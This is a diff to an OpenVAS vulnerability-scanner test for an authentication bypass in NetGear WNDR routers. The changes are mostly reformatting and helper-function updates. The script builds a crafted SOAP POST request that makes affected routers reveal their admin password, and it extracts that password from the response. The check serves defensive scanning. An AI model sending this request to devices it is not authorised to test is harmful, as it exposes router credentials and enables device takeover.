@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_netgear_auth_bypass_02_15.nasl 6376 2017-06-20 10:00:24Z teissa $
+# $Id: gb_netgear_auth_bypass_02_15.nasl 11423 2018-09-17 07:35:16Z cfischer $
 #
 # NetGear WNDR Authentication Bypass / Information Disclosure
 #
@@ -25,63 +25,68 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.105223");
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_version ("$Revision: 6376 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.105223");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_version("$Revision: 11423 $");
 
- script_name("NetGear WNDR Authentication Bypass / Information Disclosure");
+  script_name("NetGear WNDR Authentication Bypass / Information Disclosure");
 
- script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Feb/56");
+  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Feb/56");
 
- script_tag(name: "impact" , value:"Affected devices can be interrogated and hijacked");
- script_tag(name: "affected", value: "Platforms / Firmware confirmed affected:
-----
-NetGear WNDR3700v4 - V1.0.0.4SH
-NetGear WNDR3700v4 - V1.0.1.52
-NetGear WNR2200 - V1.0.1.88
-NetGear WNR2500 - V1.0.0.24
+  script_tag(name:"impact", value:"Affected devices can be interrogated and hijacked");
+  script_tag(name:"affected", value:"Platforms / Firmware confirmed affected:
 
-Additional platforms believed to be affected:
-----
-NetGear WNDR3800
-NetGear WNDRMAC
-NetGear WPN824N
-NetGear WNDR4700");
+  NetGear WNDR3700v4 - V1.0.0.4SH
 
- script_tag(name: "vuldetect" , value:"Send a special crafted POST request and check the response");
- script_tag(name: "solution" , value:"Ask the vendor for an update. Ensure remote WAN management is disabled on the affected devices.
-Only allow trusted devices access to the local network.");
+  NetGear WNDR3700v4 - V1.0.1.52
 
- script_tag(name: "summary" , value:"A number of NetGear WNDR devices contain an embedded SOAP service that
-is seemingly for use with the NetGear Genie application. This service allows for viewing and setting of certain
-router parameters. This SOAP service is prone to an authentication bypass.");
+  NetGear WNR2200 - V1.0.1.88
 
- script_tag(name:"solution_type", value: "Workaround");
- script_tag(name:"qod_type", value:"remote_vul");
+  NetGear WNR2500 - V1.0.0.24
 
- script_tag(name:"last_modification", value:"$Date: 2017-06-20 12:00:24 +0200 (Tue, 20 Jun 2017) $");
- script_tag(name:"creation_date", value:"2015-02-19 16:42:31 +0100 (Thu, 19 Feb 2015)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- exit(0);
+  Additional platforms believed to be affected:
+
+  NetGear WNDR3800
+
+  NetGear WNDRMAC
+
+  NetGear WPN824N
+
+  NetGear WNDR4700");
+
+  script_tag(name:"vuldetect", value:"Send a special crafted POST request and check the response");
+
+  script_tag(name:"solution", value:"Ask the vendor for an update. Ensure remote WAN management is disabled on the affected devices.
+  Only allow trusted devices access to the local network.");
+
+  script_tag(name:"summary", value:"A number of NetGear WNDR devices contain an embedded SOAP service that
+  is seemingly for use with the NetGear Genie application. This service allows for viewing and setting of certain
+  router parameters. This SOAP service is prone to an authentication bypass.");
+
+  script_tag(name:"solution_type", value:"Workaround");
+  script_tag(name:"qod_type", value:"remote_vul");
+
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 09:35:16 +0200 (Mon, 17 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2015-02-19 16:42:31 +0100 (Thu, 19 Feb 2015)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+
+  exit(0);
 }
-
 
 include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port( default:80 );
+useragent = get_http_user_agent();
+host = http_host_name( port:port );
 
-host = get_host_name();
-
-if( port != 80 && port != 443 )
-  host += ':' + port;
 
 req = 'POST / HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n' +
@@ -90,12 +95,12 @@ req = 'POST / HTTP/1.1\r\n' +
       'Soapaction: urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo\r\n' +
       'Content-Length: 1\r\n' +
       'Content-Type: application/x-www-form-urlencoded\r\n' +
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+      'User-Agent: ' + useragent + '\r\n' +
       '\r\n' +
       '=';
 
 buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
-if( buf !~ "HTTP/1.. 200" || ( "GetInfoResponse" >!< buf || "NewPassword" >!< buf ) ) exit( 0 );
+if( buf !~ "^HTTP/1\.[01] 200" || ( "GetInfoResponse" >!< buf || "NewPassword" >!< buf ) ) exit( 0 );
 
 pass = eregmatch( pattern:'<NewPassword>([^<]+)</NewPassword>', string:buf );
 if( ! isnull( pass[1] ) ) password = pass[1];
@@ -108,4 +113,3 @@ if( password )
 }
 
 exit( 0 );
-
